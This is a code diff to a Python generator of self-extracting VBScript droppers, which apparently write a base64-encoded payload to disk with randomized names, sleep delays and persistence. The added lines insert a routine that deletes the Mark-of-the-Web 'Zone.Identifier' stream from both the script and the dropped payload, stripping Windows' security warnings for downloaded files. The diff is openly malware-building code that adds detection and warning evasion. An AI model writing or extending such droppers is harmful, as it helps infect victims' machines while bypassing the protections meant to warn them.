@@ -203,7 +203,15 @@ def generate_self_extracting_vbs(
 
     persistence_block = _build_persistence_block(persistence, v_shell, v_filepath, v_cmd, fn_delay)
 
+    v_fso_motw = _rand_name()
+    fn_strip_motw = 'StripMOTW' + _rand_name(6)
+
     main_lines = []
+    main_lines.append(f'On Error Resume Next')
+    main_lines.append(f'{fn_strip_motw} WScript.ScriptFullName')
+    main_lines.append(f'Err.Clear')
+    main_lines.append(f'On Error GoTo 0')
+    main_lines.append(f'')
     main_lines.append(f'Set {v_shell} = CreateObject("WScript.Shell")')
     main_lines.append(f'')
     main_lines.append(f'{v_b64} = "{base64_data}"')
@@ -211,6 +219,7 @@ def generate_self_extracting_vbs(
     main_lines.append(f'')
     main_lines.append(f'{v_filepath} = {path_expr}')
     main_lines.append(f'{fn_write} {v_filepath}, {v_decoded}')
+    main_lines.append(f'{fn_strip_motw} {v_filepath}')
     main_lines.append(f'')
     if delays:
         main_lines.append(delay_call)
@@ -260,6 +269,16 @@ def generate_self_extracting_vbs(
     func_lines.append(f'    Dim dt')
     func_lines.append(f'    dt = Int((mx - mn + 1) * Rnd + mn)')
     func_lines.append(f'    WScript.Sleep dt')
+    func_lines.append(f'End Sub')
+
+    func_lines.append(f'')
+    func_lines.append(f'Sub {fn_strip_motw}(targetPath)')
+    func_lines.append(f'    On Error Resume Next')
+    func_lines.append(f'    Dim {v_fso_motw}')
+    func_lines.append(f'    Set {v_fso_motw} = CreateObject("Scripting.FileSystemObject")')
+    func_lines.append(f'    {v_fso_motw}.DeleteFile targetPath & ":Zone.Identifier"')
+    func_lines.append(f'    Err.Clear')
+    func_lines.append(f'    Set {v_fso_motw} = Nothing')
     func_lines.append(f'End Sub')
 
     return '\n'.join(main_lines + func_lines)
